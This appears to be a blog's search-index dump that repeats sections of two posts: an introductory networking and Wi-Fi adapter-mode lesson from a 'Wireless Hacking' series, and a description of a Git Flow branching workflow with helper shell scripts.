Local Network Communication: With the assigned IP address, the device can now communicate with other devices on the local network. It can send data packets to other devices by addressing them using their IP addresses within the same network. This communication happens directly between devices within the network without involving the router. Destination Outside the Local Network: If the device wants to communicate with a destination outside the local network (e.g., a website or a server on the internet), it follows these steps: 49.8.1 Determining the Gateway The device checks its network configuration and identifies the default gateway, which is the IP address of the router. The gateway acts as the exit point for traffic leaving the local network. 49.8.2 Data Routing The device encapsulates the data it wants to send within packets. Each packet contains the destination IP address. When sent, the packets are forwarded to the default gateway (router). 49.8.3 Network Address Translation (NAT) Upon receiving the packets, the router performs Network Address Translation (NAT). It replaces the source IP address with its own public IP address, hiding private IPs of local devices. This ensures that response packets can return to the router. 49.8.4 Routing to the Internet The router examines the destination IP and checks its routing table to find the next-hop router or gateway. It forwards the packets until they reach the destination network (e.g., the internet). 49.8.5 Public IP Communication Response packets are routed back using the router’s public IP address. The router uses its NAT records to translate the destination IP back to the private IP of the originating device. 49.8.6 Delivery to the Device The router forwards the response packets to the correct device on the local network. The device processes the data, enabling the user to view webpages, receive emails, or use internet services. Note Each device on the network uses Router’s Public Ip address to communicate to the whole world. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:8","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#data-routing"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.8 Working Of WIFI Device Connection to the Network: When a device (e.g., a computer, smartphone, or IoT device) connects to a network, it typically does so via a physical connection (e.g., Ethernet cable) or wirelessly through Wi-Fi. The device sends a request to join the network, and the network infrastructure, including the router, facilitates the connection. Obtaining an IP Address: Once connected, the device needs to obtain an IP address to communicate on the network. There are two main methods for IP address assignment: static and dynamic. In the case of dynamic IP address assignment, the device sends a request to the router using the DHCP protocol, which we discussed earlier. The router then assigns an available IP address from its pool and provides it to the device. Local Network Communication: With the assigned IP address, the device can now communicate with other devices on the local network. It can send data packets to other devices by addressing them using their IP addresses within the same network. This communication happens directly between devices within the network without involving the router. Destination Outside the Local Network: If the device wants to communicate with a destination outside the local network (e.g., a website or a server on the internet), it follows these steps: 49.8.1 Determining the Gateway The device checks its network configuration and identifies the default gateway, which is the IP address of the router. The gateway acts as the exit point for traffic leaving the local network. 49.8.2 Data Routing The device encapsulates the data it wants to send within packets. Each packet contains the destination IP address. When sent, the packets are forwarded to the default gateway (router). 49.8.3 Network Address Translation (NAT) Upon receiving the packets, the router performs Network Address Translation (NAT). It replaces the source IP address with its own public IP address, hiding private IPs of local devices. This ensures that response packets can return to the router. 49.8.4 Routing to the Internet The router examines the destination IP and checks its routing table to find the next-hop router or gateway. It forwards the packets until they reach the destination network (e.g., the internet). 49.8.5 Public IP Communication Response packets are routed back using the router’s public IP address. The router uses its NAT records to translate the destination IP back to the private IP of the originating device. 49.8.6 Delivery to the Device The router forwards the response packets to the correct device on the local network. The device processes the data, enabling the user to view webpages, receive emails, or use internet services. Note Each device on the network uses Router’s Public Ip address to communicate to the whole world. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:8","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#network-address-translation-nat"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.8 Working Of WIFI Device Connection to the Network: When a device (e.g., a computer, smartphone, or IoT device) connects to a network, it typically does so via a physical connection (e.g., Ethernet cable) or wirelessly through Wi-Fi. The device sends a request to join the network, and the network infrastructure, including the router, facilitates the connection. Obtaining an IP Address: Once connected, the device needs to obtain an IP address to communicate on the network. There are two main methods for IP address assignment: static and dynamic. In the case of dynamic IP address assignment, the device sends a request to the router using the DHCP protocol, which we discussed earlier. The router then assigns an available IP address from its pool and provides it to the device. Local Network Communication: With the assigned IP address, the device can now communicate with other devices on the local network. It can send data packets to other devices by addressing them using their IP addresses within the same network. This communication happens directly between devices within the network without involving the router. Destination Outside the Local Network: If the device wants to communicate with a destination outside the local network (e.g., a website or a server on the internet), it follows these steps: 49.8.1 Determining the Gateway The device checks its network configuration and identifies the default gateway, which is the IP address of the router. The gateway acts as the exit point for traffic leaving the local network. 49.8.2 Data Routing The device encapsulates the data it wants to send within packets. Each packet contains the destination IP address. When sent, the packets are forwarded to the default gateway (router). 49.8.3 Network Address Translation (NAT) Upon receiving the packets, the router performs Network Address Translation (NAT). It replaces the source IP address with its own public IP address, hiding private IPs of local devices. This ensures that response packets can return to the router. 49.8.4 Routing to the Internet The router examines the destination IP and checks its routing table to find the next-hop router or gateway. It forwards the packets until they reach the destination network (e.g., the internet). 49.8.5 Public IP Communication Response packets are routed back using the router’s public IP address. The router uses its NAT records to translate the destination IP back to the private IP of the originating device. 49.8.6 Delivery to the Device The router forwards the response packets to the correct device on the local network. The device processes the data, enabling the user to view webpages, receive emails, or use internet services. Note Each device on the network uses Router’s Public Ip address to communicate to the whole world. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:8","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#routing-to-the-internet"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.8 Working Of WIFI Device Connection to the Network: When a device (e.g., a computer, smartphone, or IoT device) connects to a network, it typically does so via a physical connection (e.g., Ethernet cable) or wirelessly through Wi-Fi. The device sends a request to join the network, and the network infrastructure, including the router, facilitates the connection. Obtaining an IP Address: Once connected, the device needs to obtain an IP address to communicate on the network. There are two main methods for IP address assignment: static and dynamic. In the case of dynamic IP address assignment, the device sends a request to the router using the DHCP protocol, which we discussed earlier. The router then assigns an available IP address from its pool and provides it to the device. Local Network Communication: With the assigned IP address, the device can now communicate with other devices on the local network. It can send data packets to other devices by addressing them using their IP addresses within the same network. This communication happens directly between devices within the network without involving the router. Destination Outside the Local Network: If the device wants to communicate with a destination outside the local network (e.g., a website or a server on the internet), it follows these steps: 49.8.1 Determining the Gateway The device checks its network configuration and identifies the default gateway, which is the IP address of the router. The gateway acts as the exit point for traffic leaving the local network. 49.8.2 Data Routing The device encapsulates the data it wants to send within packets. Each packet contains the destination IP address. When sent, the packets are forwarded to the default gateway (router). 49.8.3 Network Address Translation (NAT) Upon receiving the packets, the router performs Network Address Translation (NAT). It replaces the source IP address with its own public IP address, hiding private IPs of local devices. This ensures that response packets can return to the router. 49.8.4 Routing to the Internet The router examines the destination IP and checks its routing table to find the next-hop router or gateway. It forwards the packets until they reach the destination network (e.g., the internet). 49.8.5 Public IP Communication Response packets are routed back using the router’s public IP address. The router uses its NAT records to translate the destination IP back to the private IP of the originating device. 49.8.6 Delivery to the Device The router forwards the response packets to the correct device on the local network. The device processes the data, enabling the user to view webpages, receive emails, or use internet services. Note Each device on the network uses Router’s Public Ip address to communicate to the whole world. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:8","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#public-ip-communication"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.8 Working Of WIFI Device Connection to the Network: When a device (e.g., a computer, smartphone, or IoT device) connects to a network, it typically does so via a physical connection (e.g., Ethernet cable) or wirelessly through Wi-Fi. The device sends a request to join the network, and the network infrastructure, including the router, facilitates the connection. Obtaining an IP Address: Once connected, the device needs to obtain an IP address to communicate on the network. There are two main methods for IP address assignment: static and dynamic. In the case of dynamic IP address assignment, the device sends a request to the router using the DHCP protocol, which we discussed earlier. The router then assigns an available IP address from its pool and provides it to the device. Local Network Communication: With the assigned IP address, the device can now communicate with other devices on the local network. It can send data packets to other devices by addressing them using their IP addresses within the same network. This communication happens directly between devices within the network without involving the router. Destination Outside the Local Network: If the device wants to communicate with a destination outside the local network (e.g., a website or a server on the internet), it follows these steps: 49.8.1 Determining the Gateway The device checks its network configuration and identifies the default gateway, which is the IP address of the router. The gateway acts as the exit point for traffic leaving the local network. 49.8.2 Data Routing The device encapsulates the data it wants to send within packets. Each packet contains the destination IP address. When sent, the packets are forwarded to the default gateway (router). 49.8.3 Network Address Translation (NAT) Upon receiving the packets, the router performs Network Address Translation (NAT). It replaces the source IP address with its own public IP address, hiding private IPs of local devices. This ensures that response packets can return to the router. 49.8.4 Routing to the Internet The router examines the destination IP and checks its routing table to find the next-hop router or gateway. It forwards the packets until they reach the destination network (e.g., the internet). 49.8.5 Public IP Communication Response packets are routed back using the router’s public IP address. The router uses its NAT records to translate the destination IP back to the private IP of the originating device. 49.8.6 Delivery to the Device The router forwards the response packets to the correct device on the local network. The device processes the data, enabling the user to view webpages, receive emails, or use internet services. Note Each device on the network uses Router’s Public Ip address to communicate to the whole world. ","date":"2025-05-20","objectID":"/posts/wireless01/:9:8","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#delivery-to-the-device"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.9 Wi-Fi Adapter Operation Modes Wi-Fi adapters can function in various modes, depending on their features and configuration. These modes define how the adapter handles the transmission and reception of wireless signals. 49.9.1 Infrastructure (Managed) Mode This is the standard mode for most Wi-Fi adapters. In infrastructure mode, the adapter connects to a wireless router or access point to join an existing network. It enables the device to access the internet and communicate with other devices within the same network. 49.9.2 Soft Access Point (Soft AP) Mode Some adapters support Soft AP mode, which allows them to act as virtual access points. In this configuration, the adapter creates its own wireless network, letting other devices connect to it. Useful for sharing an internet connection or setting up a temporary local network. 49.9.3 Monitor Mode Monitor mode allows the adapter to passively capture all wireless signals in range without joining a network. It’s used for analyzing wireless traffic, network diagnostics, or packet sniffing for security or troubleshooting. 49.9.4 Promiscuous Mode While similar to monitor mode, promiscuous mode focuses on capturing all traffic the adapter can receive, regardless of destination. It is used in network analysis and security assessments to inspect and study data packets for anomalies or threats. Note All of the above-mentioned modes are not available in all WIFI adaptors, there are only specific WIFI adaptors in the market that supports modes other than managed mode. So to fully learn from these series you will have to get an adaptor which these modes There is a list of WIFI adaptors from which you can choose: Alfa AC1900 WiFi Adapter Alfa Long-Range Dual-Band AC1200 Wireless USB 3.0 TP-Link Nano USB Wifi Dongle 150Mbps High Gain Wireless Network Adapter TRENDnet AC1900 High Power Dual Band Wireless USB Adapter Alfa AWUS036NHA Panda Wireless® Mid Range 150Mbps ","date":"2025-05-20","objectID":"/posts/wireless01/:9:9","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#wi-fi-adapter-operation-modes"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.9 Wi-Fi Adapter Operation Modes Wi-Fi adapters can function in various modes, depending on their features and configuration. These modes define how the adapter handles the transmission and reception of wireless signals. 49.9.1 Infrastructure (Managed) Mode This is the standard mode for most Wi-Fi adapters. In infrastructure mode, the adapter connects to a wireless router or access point to join an existing network. It enables the device to access the internet and communicate with other devices within the same network. 49.9.2 Soft Access Point (Soft AP) Mode Some adapters support Soft AP mode, which allows them to act as virtual access points. In this configuration, the adapter creates its own wireless network, letting other devices connect to it. Useful for sharing an internet connection or setting up a temporary local network. 49.9.3 Monitor Mode Monitor mode allows the adapter to passively capture all wireless signals in range without joining a network. It’s used for analyzing wireless traffic, network diagnostics, or packet sniffing for security or troubleshooting. 49.9.4 Promiscuous Mode While similar to monitor mode, promiscuous mode focuses on capturing all traffic the adapter can receive, regardless of destination. It is used in network analysis and security assessments to inspect and study data packets for anomalies or threats. Note All of the above-mentioned modes are not available in all WIFI adaptors, there are only specific WIFI adaptors in the market that supports modes other than managed mode. So to fully learn from these series you will have to get an adaptor which these modes There is a list of WIFI adaptors from which you can choose: Alfa AC1900 WiFi Adapter Alfa Long-Range Dual-Band AC1200 Wireless USB 3.0 TP-Link Nano USB Wifi Dongle 150Mbps High Gain Wireless Network Adapter TRENDnet AC1900 High Power Dual Band Wireless USB Adapter Alfa AWUS036NHA Panda Wireless® Mid Range 150Mbps ","date":"2025-05-20","objectID":"/posts/wireless01/:9:9","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#infrastructure-managed-mode"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.9 Wi-Fi Adapter Operation Modes Wi-Fi adapters can function in various modes, depending on their features and configuration. These modes define how the adapter handles the transmission and reception of wireless signals. 49.9.1 Infrastructure (Managed) Mode This is the standard mode for most Wi-Fi adapters. In infrastructure mode, the adapter connects to a wireless router or access point to join an existing network. It enables the device to access the internet and communicate with other devices within the same network. 49.9.2 Soft Access Point (Soft AP) Mode Some adapters support Soft AP mode, which allows them to act as virtual access points. In this configuration, the adapter creates its own wireless network, letting other devices connect to it. Useful for sharing an internet connection or setting up a temporary local network. 49.9.3 Monitor Mode Monitor mode allows the adapter to passively capture all wireless signals in range without joining a network. It’s used for analyzing wireless traffic, network diagnostics, or packet sniffing for security or troubleshooting. 49.9.4 Promiscuous Mode While similar to monitor mode, promiscuous mode focuses on capturing all traffic the adapter can receive, regardless of destination. It is used in network analysis and security assessments to inspect and study data packets for anomalies or threats. Note All of the above-mentioned modes are not available in all WIFI adaptors, there are only specific WIFI adaptors in the market that supports modes other than managed mode. So to fully learn from these series you will have to get an adaptor which these modes There is a list of WIFI adaptors from which you can choose: Alfa AC1900 WiFi Adapter Alfa Long-Range Dual-Band AC1200 Wireless USB 3.0 TP-Link Nano USB Wifi Dongle 150Mbps High Gain Wireless Network Adapter TRENDnet AC1900 High Power Dual Band Wireless USB Adapter Alfa AWUS036NHA Panda Wireless® Mid Range 150Mbps ","date":"2025-05-20","objectID":"/posts/wireless01/:9:9","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#soft-access-point-soft-ap-mode"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.9 Wi-Fi Adapter Operation Modes Wi-Fi adapters can function in various modes, depending on their features and configuration. These modes define how the adapter handles the transmission and reception of wireless signals. 49.9.1 Infrastructure (Managed) Mode This is the standard mode for most Wi-Fi adapters. In infrastructure mode, the adapter connects to a wireless router or access point to join an existing network. It enables the device to access the internet and communicate with other devices within the same network. 49.9.2 Soft Access Point (Soft AP) Mode Some adapters support Soft AP mode, which allows them to act as virtual access points. In this configuration, the adapter creates its own wireless network, letting other devices connect to it. Useful for sharing an internet connection or setting up a temporary local network. 49.9.3 Monitor Mode Monitor mode allows the adapter to passively capture all wireless signals in range without joining a network. It’s used for analyzing wireless traffic, network diagnostics, or packet sniffing for security or troubleshooting. 49.9.4 Promiscuous Mode While similar to monitor mode, promiscuous mode focuses on capturing all traffic the adapter can receive, regardless of destination. It is used in network analysis and security assessments to inspect and study data packets for anomalies or threats. Note All of the above-mentioned modes are not available in all WIFI adaptors, there are only specific WIFI adaptors in the market that supports modes other than managed mode. So to fully learn from these series you will have to get an adaptor which these modes There is a list of WIFI adaptors from which you can choose: Alfa AC1900 WiFi Adapter Alfa Long-Range Dual-Band AC1200 Wireless USB 3.0 TP-Link Nano USB Wifi Dongle 150Mbps High Gain Wireless Network Adapter TRENDnet AC1900 High Power Dual Band Wireless USB Adapter Alfa AWUS036NHA Panda Wireless® Mid Range 150Mbps ","date":"2025-05-20","objectID":"/posts/wireless01/:9:9","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#monitor-mode"},{"categories":["Guides"],"collections":["Getting Started"],"content":"49.9 Wi-Fi Adapter Operation Modes Wi-Fi adapters can function in various modes, depending on their features and configuration. These modes define how the adapter handles the transmission and reception of wireless signals. 49.9.1 Infrastructure (Managed) Mode This is the standard mode for most Wi-Fi adapters. In infrastructure mode, the adapter connects to a wireless router or access point to join an existing network. It enables the device to access the internet and communicate with other devices within the same network. 49.9.2 Soft Access Point (Soft AP) Mode Some adapters support Soft AP mode, which allows them to act as virtual access points. In this configuration, the adapter creates its own wireless network, letting other devices connect to it. Useful for sharing an internet connection or setting up a temporary local network. 49.9.3 Monitor Mode Monitor mode allows the adapter to passively capture all wireless signals in range without joining a network. It’s used for analyzing wireless traffic, network diagnostics, or packet sniffing for security or troubleshooting. 49.9.4 Promiscuous Mode While similar to monitor mode, promiscuous mode focuses on capturing all traffic the adapter can receive, regardless of destination. It is used in network analysis and security assessments to inspect and study data packets for anomalies or threats. Note All of the above-mentioned modes are not available in all WIFI adaptors, there are only specific WIFI adaptors in the market that supports modes other than managed mode. So to fully learn from these series you will have to get an adaptor which these modes There is a list of WIFI adaptors from which you can choose: Alfa AC1900 WiFi Adapter Alfa Long-Range Dual-Band AC1200 Wireless USB 3.0 TP-Link Nano USB Wifi Dongle 150Mbps High Gain Wireless Network Adapter TRENDnet AC1900 High Power Dual Band Wireless USB Adapter Alfa AWUS036NHA Panda Wireless® Mid Range 150Mbps ","date":"2025-05-20","objectID":"/posts/wireless01/:9:9","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#promiscuous-mode"},{"categories":["Guides"],"collections":["Getting Started"],"content":"50 Conclusion In this first part of our wireless hacking series, we’ve laid the foundation for understanding how Wi-Fi networks work, covering the fundamental concepts, essential terms, and the history behind the technology. Understanding these basics is key to mastering more advanced topics like network security, encryption protocols, and wireless attacks. As we move forward, we’ll dive deeper into practical techniques and tools that will help us secure and audit wireless networks. In the next part, we’ll set up a safe, isolated testing environment to begin experimenting with attacks, allowing us to learn by doing. ","date":"2025-05-20","objectID":"/posts/wireless01/:10:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 1","uri":"/posts/wireless01/#conclusion"},{"categories":["Thoughts"],"collections":["Welcome"],"content":" “Behind every well-organized repo lies a story of purpose, experimentation, and constant iteration.” ","date":"2025-05-12","objectID":"/posts/github/:0:0","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"17 About After years of hands-on experience in cybersecurity and development, I’ve learned that code is just one part of the battle. The structure we build around our work — our process, our repository, our mindset — is what allows our projects to scale, evolve, and remain resilient. This GitHub Page is more than just a collection of code — it’s a reflection of my workflow, my evolution, and the systems I’ve put in place to stay adaptable in a fast-changing world. ","date":"2025-05-12","objectID":"/posts/github/:1:0","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#about"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"18 Architecture To give you a better idea of how I separate concerns and automate deployments, here’s a simplified view of the repository workflow Each directory, file, and branch serves a purpose. Here’s a high-level overview of how my main repository is structured: flowchart LR L[Local Files] L2[Local Files] GH_Private[(GitHub Private Repo)] GH_Public[(GitHub Public Repo)] Actions[GitHub Actions] GH_Pages[GitHub Pages] Vercel[Vercel] More[More...] L --\u003e|Git Push| GH_Private L2 --\u003e|Git Push| GH_Public GH_Private --\u003e|Git Submodule| GH_Public GH_Public --\u003e Actions Actions --\u003e|Deploy| GH_Pages Actions --\u003e|Deploy| Vercel Actions --\u003e|Deploy| More flowchart LR L[Local Files] L2[Local Files] GH_Private[(GitHub Private Repo)] GH_Public[(GitHub Public Repo)] Actions[GitHub Actions] GH_Pages[GitHub Pages] Vercel[Vercel] More[More...] L --\u003e|Git Push| GH_Private L2 --\u003e|Git Push| GH_Public GH_Private --\u003e|Git Submodule| GH_Public GH_Public --\u003e Actions Actions --\u003e|Deploy| GH_Pages Actions --\u003e|Deploy| Vercel Actions --\u003e|Deploy| More flowchart LR L[Local Files] L2[Local Files] GH_Private[(GitHub Private Repo)] GH_Public[(GitHub Public Repo)] Actions[GitHub Actions] GH_Pages[GitHub Pages] Vercel[Vercel] More[More...] L --\u003e|Git Push| GH_Private L2 --\u003e|Git Push| GH_Public GH_Private --\u003e|Git Submodule| GH_Public GH_Public --\u003e Actions Actions --\u003e|Deploy| GH_Pages Actions --\u003e|Deploy| Vercel Actions --\u003e|Deploy| More flowchart LR L[Local Files] L2[Local Files] GH_Private[(GitHub Private Repo)] GH_Public[(GitHub Public Repo)] Actions[GitHub Actions] GH_Pages[GitHub Pages] Vercel[Vercel] More[More...] L --\u003e|Git Push| GH_Private L2 --\u003e|Git Push| GH_Public GH_Private --\u003e|Git Submodule| GH_Public GH_Public --\u003e Actions Actions --\u003e|Deploy| GH_Pages Actions --\u003e|Deploy| Vercel Actions --\u003e|Deploy| More ","date":"2025-05-12","objectID":"/posts/github/:2:0","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#architecture"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"19 Branch I follow a Git Flow-inspired model because it enforces discipline in collaborative work. It allows features, hotfixes, and releases to evolve in parallel, with clear boundaries and responsibilities Maintaining a clean and sustainable workflow is key in collaborative and long-term projects. Here’s the branching model I follow: main – The production branch. Only stable, reviewed, and tested code lives here. develop – The integration branch for ongoing development. Features are merged here after review and testing. feature/* – Used for individual feature development (e.g., feature/log-capture, feature/api-hardening). bugfix/* – Quick patches or specific bug resolutions. release/* – For preparing stable releases, including documentation and final testing. This structure allows me to stay agile while ensuring quality and traceability in the work I deliver. gitGraph commit id: \"Initial commit\" branch develop checkout develop commit id: \"Init project structure\" commit id: \"Setup CI/CD\" branch feature/log-capture checkout feature/log-capture commit id: \"Add log capture module\" checkout develop merge feature/log-capture id: \"Merge log-capture\" branch feature/api-hardening checkout feature/api-hardening commit id: \"Improve API input validation\" commit id: \"Add rate limiting\" checkout develop merge feature/api-hardening id: \"Merge api-hardening\" branch bugfix/token-expiry checkout bugfix/token-expiry commit id: \"Fix token expiry bug\" checkout develop merge bugfix/token-expiry id: \"Merge token fix\" branch release/v1.0 checkout release/v1.0 commit id: \"Prepare release v1.0\" checkout main merge release/v1.0 id: \"Release v1.0 to production\" commit id: \"Hotfix README\" checkout develop branch feature/ui-redesign commit id: \"Start UI redesign\" gitGraph commit id: \"Initial commit\" branch develop checkout develop commit id: \"Init project structure\" commit id: \"Setup CI/CD\" branch feature/log-capture checkout feature/log-capture commit id: \"Add log capture module\" checkout develop merge feature/log-capture id: \"Merge log-capture\" branch feature/api-hardening checkout feature/api-hardening commit id: \"Improve API input validation\" commit id: \"Add rate limiting\" checkout develop merge feature/api-hardening id: \"Merge api-hardening\" branch bugfix/token-expiry checkout bugfix/token-expiry commit id: \"Fix token expiry bug\" checkout develop merge bugfix/token-expiry id: \"Merge token fix\" branch release/v1.0 checkout release/v1.0 commit id: \"Prepare release v1.0\" checkout main merge release/v1.0 id: \"Release v1.0 to production\" commit id: \"Hotfix README\" checkout develop branch feature/ui-redesign commit id: \"Start UI redesign\" gitGraph commit id: \"Initial commit\" branch develop checkout develop commit id: \"Init project structure\" commit id: \"Setup CI/CD\" branch feature/log-capture checkout feature/log-capture commit id: \"Add log capture module\" checkout develop merge feature/log-capture id: \"Merge log-capture\" branch feature/api-hardening checkout feature/api-hardening commit id: \"Improve API input validation\" commit id: \"Add rate limiting\" checkout develop merge feature/api-hardening id: \"Merge api-hardening\" branch bugfix/token-expiry checkout bugfix/token-expiry commit id: \"Fix token expiry bug\" checkout develop merge bugfix/token-expiry id: \"Merge token fix\" branch release/v1.0 checkout release/v1.0 commit id: \"Prepare release v1.0\" checkout main merge release/v1.0 id: \"Release v1.0 to production\" commit id: \"Hotfix README\" checkout develop branch feature/ui-redesign commit id: \"Start UI redesign\" gitGraph commit id: \"Initial commit\" branch develop checkout develop commit id: \"Init project structure\" commit id: \"Setup CI/CD\" branch feature/log-capture checkout feature/log-capture commit id: \"Add log capture module\" checkout develop merge feature/log-capture id: \"Merge log-capture\" branch feature/api-hardening checkout feature/api-hardening commit id: \"Improve API input validation\" commit id: \"Add rate limiting\" checkout develop merge featu","date":"2025-05-12","objectID":"/posts/github/:3:0","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#branch"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"20 Automation This repository follows a customized Git Flow strategy using helper shell scripts to simplify and streamline branch management, releases, and cleanup via the GitHub CLI. Important Before running any scripts, make sure you are in the root directory of the project. You’ll also need to have Git installed on your machine, as well as the GitHub CLI (gh). Ensure that gh is authenticated by running gh auth login if you haven’t already. ","date":"2025-05-12","objectID":"/posts/github/:4:0","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#automation"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"20.1 Script Overview Script Purpose github-branch.sh Create a branch (feature/, bugfix/, hotfix/, release/) and optionally open a pull request github-deploy Prepare and merge a release branch into main, then sync with develop github-merged.sh Clean up a merged branch locally and remotely Note All scripts used to automate and simplify the Git workflow are stored in the .shell/ directory at the root of the project. This dedicated folder centralizes all shell scripts related to branch management, deployment, and cleanup tasks, making it easier to maintain and update the automation tools. By keeping these scripts organized in one place, you can quickly locate, modify, or extend the workflow helpers as needed, ensuring a clean and manageable project structure. ","date":"2025-05-12","objectID":"/posts/github/:4:1","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#script-overview"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"20.2 Usage 20.2.1 Create a Branch (Feature, Bugfix, etc.) ./.shell/github-branch.sh You will be prompted to: Choose the branch type: feature/ bugfix/ hotfix/ release/ Enter a descriptive name (e.g., fix-login-error) Decide whether to push and create a Pull Request (PR) right away The script will: Checkout the correct base branch (main or develop) Create and switch to the new branch Optionally push and open a PR via GitHub CLI 20.2.2 Deploy a Release ./.scripts/github-deploy This script helps with the release process: Create a release/x.y.z branch from develop Wait for you to finalize and commit all changes Push and open a PR into main After confirming merge, it: Updates main Merges main back into develop Pushes changes 20.2.3 Clean Up Merged Branches ./.scripts/github-merged.sh Once your Pull Request has been merged on GitHub: Run this script from the feature/hotfix/release branch It will: Confirm you’re on a non-protected branch Switch to main or develop Delete the merged branch locally and remotely Note Protected branches such as main and develop are safeguarded by repository settings to prevent accidental deletion or force-pushes. For this reason, the cleanup script will not allow you to delete these branches locally or remotely. This ensures the stability and integrity of your main development and production branches throughout your workflow. ","date":"2025-05-12","objectID":"/posts/github/:4:2","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#usage"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"20.2 Usage 20.2.1 Create a Branch (Feature, Bugfix, etc.) ./.shell/github-branch.sh You will be prompted to: Choose the branch type: feature/ bugfix/ hotfix/ release/ Enter a descriptive name (e.g., fix-login-error) Decide whether to push and create a Pull Request (PR) right away The script will: Checkout the correct base branch (main or develop) Create and switch to the new branch Optionally push and open a PR via GitHub CLI 20.2.2 Deploy a Release ./.scripts/github-deploy This script helps with the release process: Create a release/x.y.z branch from develop Wait for you to finalize and commit all changes Push and open a PR into main After confirming merge, it: Updates main Merges main back into develop Pushes changes 20.2.3 Clean Up Merged Branches ./.scripts/github-merged.sh Once your Pull Request has been merged on GitHub: Run this script from the feature/hotfix/release branch It will: Confirm you’re on a non-protected branch Switch to main or develop Delete the merged branch locally and remotely Note Protected branches such as main and develop are safeguarded by repository settings to prevent accidental deletion or force-pushes. For this reason, the cleanup script will not allow you to delete these branches locally or remotely. This ensures the stability and integrity of your main development and production branches throughout your workflow. ","date":"2025-05-12","objectID":"/posts/github/:4:2","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#create-a-branch-feature-bugfix-etc"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"20.2 Usage 20.2.1 Create a Branch (Feature, Bugfix, etc.) ./.shell/github-branch.sh You will be prompted to: Choose the branch type: feature/ bugfix/ hotfix/ release/ Enter a descriptive name (e.g., fix-login-error) Decide whether to push and create a Pull Request (PR) right away The script will: Checkout the correct base branch (main or develop) Create and switch to the new branch Optionally push and open a PR via GitHub CLI 20.2.2 Deploy a Release ./.scripts/github-deploy This script helps with the release process: Create a release/x.y.z branch from develop Wait for you to finalize and commit all changes Push and open a PR into main After confirming merge, it: Updates main Merges main back into develop Pushes changes 20.2.3 Clean Up Merged Branches ./.scripts/github-merged.sh Once your Pull Request has been merged on GitHub: Run this script from the feature/hotfix/release branch It will: Confirm you’re on a non-protected branch Switch to main or develop Delete the merged branch locally and remotely Note Protected branches such as main and develop are safeguarded by repository settings to prevent accidental deletion or force-pushes. For this reason, the cleanup script will not allow you to delete these branches locally or remotely. This ensures the stability and integrity of your main development and production branches throughout your workflow. ","date":"2025-05-12","objectID":"/posts/github/:4:2","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#deploy-a-release"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"20.2 Usage 20.2.1 Create a Branch (Feature, Bugfix, etc.) ./.shell/github-branch.sh You will be prompted to: Choose the branch type: feature/ bugfix/ hotfix/ release/ Enter a descriptive name (e.g., fix-login-error) Decide whether to push and create a Pull Request (PR) right away The script will: Checkout the correct base branch (main or develop) Create and switch to the new branch Optionally push and open a PR via GitHub CLI 20.2.2 Deploy a Release ./.scripts/github-deploy This script helps with the release process: Create a release/x.y.z branch from develop Wait for you to finalize and commit all changes Push and open a PR into main After confirming merge, it: Updates main Merges main back into develop Pushes changes 20.2.3 Clean Up Merged Branches ./.scripts/github-merged.sh Once your Pull Request has been merged on GitHub: Run this script from the feature/hotfix/release branch It will: Confirm you’re on a non-protected branch Switch to main or develop Delete the merged branch locally and remotely Note Protected branches such as main and develop are safeguarded by repository settings to prevent accidental deletion or force-pushes. For this reason, the cleanup script will not allow you to delete these branches locally or remotely. This ensures the stability and integrity of your main development and production branches throughout your workflow. ","date":"2025-05-12","objectID":"/posts/github/:4:2","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#clean-up-merged-branches"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"20.3 Branch Protection (Recommended GitHub Settings) Enable protection rules on: main develop With: Require pull request reviews before merging Require status checks (if you have CI) Prevent force pushes ","date":"2025-05-12","objectID":"/posts/github/:4:3","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#branch-protection-recommended-github-settings"},{"categories":["Thoughts"],"collections":["Welcome"],"content":"20.4 Example Workflow # Start a new feature ./.shell/github-branch.sh # Work, commit, push, and open PR # After merge: ./.shell/github-merged.sh # For release: ./.shell/github-deploy Tip For easier and quicker access to the Git Flow helper scripts, you can create shell aliases by adding the following lines to 